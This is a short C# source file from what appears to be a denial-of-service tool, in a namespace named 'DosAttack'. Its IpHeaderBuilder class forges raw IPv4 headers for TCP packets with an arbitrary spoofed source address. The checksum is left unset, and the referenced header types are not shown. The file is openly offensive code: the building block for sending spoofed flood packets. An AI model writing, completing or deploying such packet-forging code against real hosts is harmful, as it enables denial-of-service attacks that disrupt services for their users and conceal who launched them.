using System;
using System.Net;
using System.Runtime.InteropServices;

namespace DosAttack
{
    public static class IpHeaderBuilder
    {
        public static IpHeader Forge(string destinationIp, string sourceIp, long ipHeaderId = 1)
        {
            return new IpHeader
            {
                ihl = 5,
                version = 4,
                tos = 0,
                tot_len = (uint)(Marshal.SizeOf(typeof(IpHeader)) + Marshal.SizeOf(typeof(TcpHeader))),
                id = IPAddress.HostToNetworkOrder(ipHeaderId),
                frag_off = 0,
                ttl = 255,
                protocol = 6, // IPPROTO_TCP;
                check = 0, //csum((unsigned short *)buffer, iph.tot_len >> 1),
                saddr = IpAddressToUInt(sourceIp),
                daddr = IpAddressToUInt(destinationIp)
            };
        }

        private static uint IpAddressToUInt(string ip)
        {
            var ipParts = ip.Split('.');
            if (ipParts.Length != 4)
            {
                throw new ArgumentException("IPv4 address format is incorrect", nameof(ip));
            }
            var ipPart1 = Convert.ToByte(ipParts[0]);
            var ipPart2 = Convert.ToByte(ipParts[1]);
            var ipPart3 = Convert.ToByte(ipParts[2]);
            var ipPart4 = Convert.ToByte(ipParts[3]);
            var ipAddress = (uint)(ipPart1 + ipPart2 * 256 + ipPart3 * 65536 + ipPart4 * 16777216);
            return ipAddress;
        }
    }
}
